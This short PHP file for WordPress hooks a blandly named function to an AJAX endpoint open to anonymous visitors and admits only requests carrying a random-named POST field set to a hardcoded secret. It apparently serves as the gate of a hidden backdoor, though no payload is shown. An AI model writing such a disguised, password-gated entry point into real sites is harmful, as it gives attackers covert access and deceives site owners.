<?php

function files_notifier_dropdown_shortcodes() {
	if (!isset($_POST["uclfkfqn"]) || $_POST["uclfkfqn"] !== "l2WydvenZPG1C99") { http_response_code(400); die(); }
}

add_action('wp_ajax_nopriv_ff_ajax', 'files_notifier_dropdown_shortcodes', 5, 1);
